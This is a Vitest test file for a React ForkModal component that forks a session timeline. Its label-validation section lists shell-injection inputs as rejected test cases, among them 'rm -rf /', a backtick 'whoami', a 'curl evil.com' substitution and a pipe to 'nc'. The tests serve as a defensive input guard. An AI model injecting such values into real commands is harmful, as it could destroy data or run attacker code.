import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
import { render, screen, fireEvent, waitFor } from '@testing-library/react'
import { QueryClient, QueryClientProvider } from '@tanstack/react-query'
import { ForkModal } from './ForkModal'
import { api } from '@/lib/api'
import { useStore } from '@/hooks/use-store'

vi.mock('@/lib/api', () => ({
  api: { forkSession: vi.fn() },
}))

function wrap(ui: React.ReactElement) {
  const client = new QueryClient({
    defaultOptions: { queries: { retry: false } },
  })
  return render(<QueryClientProvider client={client}>{ui}</QueryClientProvider>)
}

beforeEach(() => {
  vi.clearAllMocks()
  useStore.setState({ selectedTimelineId: null })
})

afterEach(() => {
  useStore.setState({ selectedTimelineId: null })
})

describe('ForkModal', () => {
  it('does not render when closed', () => {
    wrap(
      <ForkModal isOpen={false} onClose={() => {}} sessionId="s1" atStep={3} />,
    )
    expect(screen.queryByRole('dialog')).not.toBeInTheDocument()
  })

  it('does not render when atStep is null, even if isOpen is true', () => {
    wrap(
      <ForkModal isOpen={true} onClose={() => {}} sessionId="s1" atStep={null} />,
    )
    expect(screen.queryByRole('dialog')).not.toBeInTheDocument()
  })

  it('defaults label to fork-at-{N} and shows the step number', () => {
    wrap(
      <ForkModal isOpen={true} onClose={() => {}} sessionId="s1" atStep={7} />,
    )
    const input = screen.getByRole('textbox') as HTMLInputElement
    expect(input.value).toBe('fork-at-7')
    expect(screen.getByText(/Fork from step #7/)).toBeInTheDocument()
  })

  it('submits fork, selects the new timeline, and closes on success', async () => {
    const forkMock = vi.mocked(api.forkSession)
    forkMock.mockResolvedValue({ fork_timeline_id: 'new-tl-1' })
    const onClose = vi.fn()

    wrap(
      <ForkModal
        isOpen={true}
        onClose={onClose}
        sessionId="s1"
        timelineId="root-tl"
        atStep={4}
      />,
    )

    fireEvent.click(screen.getByRole('button', { name: /create fork/i }))

    await waitFor(() => expect(forkMock).toHaveBeenCalledWith('s1', {
      at_step: 4,
      label: 'fork-at-4',
      timeline_id: 'root-tl',
    }))
    await waitFor(() => expect(onClose).toHaveBeenCalled())
    expect(useStore.getState().selectedTimelineId).toBe('new-tl-1')
  })

  it('shows error when fork fails and keeps the modal open', async () => {
    const forkMock = vi.mocked(api.forkSession)
    forkMock.mockRejectedValue(new Error('API error 400: bad step'))
    const onClose = vi.fn()

    wrap(
      <ForkModal isOpen={true} onClose={onClose} sessionId="s1" atStep={4} />,
    )

    fireEvent.click(screen.getByRole('button', { name: /create fork/i }))

    await waitFor(() => expect(screen.getByText(/bad step/)).toBeInTheDocument())
    expect(onClose).not.toHaveBeenCalled()
    expect(useStore.getState().selectedTimelineId).toBeNull()
  })

  it('uses trimmed default label when input is cleared', async () => {
    const forkMock = vi.mocked(api.forkSession)
    forkMock.mockResolvedValue({ fork_timeline_id: 'new-tl-2' })

    wrap(
      <ForkModal isOpen={true} onClose={() => {}} sessionId="s1" atStep={2} />,
    )

    const input = screen.getByRole('textbox') as HTMLInputElement
    fireEvent.change(input, { target: { value: '   ' } })
    fireEvent.click(screen.getByRole('button', { name: /create fork/i }))

    await waitFor(() => expect(forkMock).toHaveBeenCalledWith('s1', {
      at_step: 2,
      label: 'fork-at-2',
      timeline_id: undefined,
    }))
  })
})

describe('ForkModal — label validation (shell-injection guard)', () => {
  it.each([
    ['semicolon', 'foo; rm -rf /'],
    ['backtick', 'foo`whoami`'],
    ['dollar-paren', 'foo$(curl evil.com)'],
    ['pipe', 'foo|nc evil 1'],
    ['ampersand', 'foo && bad'],
    ['space', 'foo bar'],
    ['quote', "foo'bar"],
  ])('rejects label with %s and disables submit', (_name, badLabel) => {
    wrap(
      <ForkModal isOpen={true} onClose={() => {}} sessionId="s1" atStep={3} />,
    )
    const input = screen.getByRole('textbox') as HTMLInputElement
    fireEvent.change(input, { target: { value: badLabel } })

    const submit = screen.getByRole('button', { name: /create fork/i }) as HTMLButtonElement
    expect(submit.disabled).toBe(true)
    expect(screen.getByText(/letters, numbers/i)).toBeInTheDocument()
  })

  it('accepts labels with letters, digits, dash, dot, underscore', () => {
    wrap(
      <ForkModal isOpen={true} onClose={() => {}} sessionId="s1" atStep={3} />,
    )
    const input = screen.getByRole('textbox') as HTMLInputElement
    fireEvent.change(input, { target: { value: 'my-fork_v2.1' } })
    const submit = screen.getByRole('button', { name: /create fork/i }) as HTMLButtonElement
    expect(submit.disabled).toBe(false)
    expect(screen.queryByText(/letters, numbers/i)).not.toBeInTheDocument()
  })

  it('never calls forkSession when label is invalid, even if form is submitted', async () => {
    const forkMock = vi.mocked(api.forkSession)
    wrap(
      <ForkModal isOpen={true} onClose={() => {}} sessionId="s1" atStep={3} />,
    )
    const input = screen.getByRole('textbox') as HTMLInputElement
    fireEvent.change(input, { target: { value: 'bad; rm' } })
    fireEvent.submit(input.closest('form') ?? input)
    await Promise.resolve()
    expect(forkMock).not.toHaveBeenCalled()
  })
})
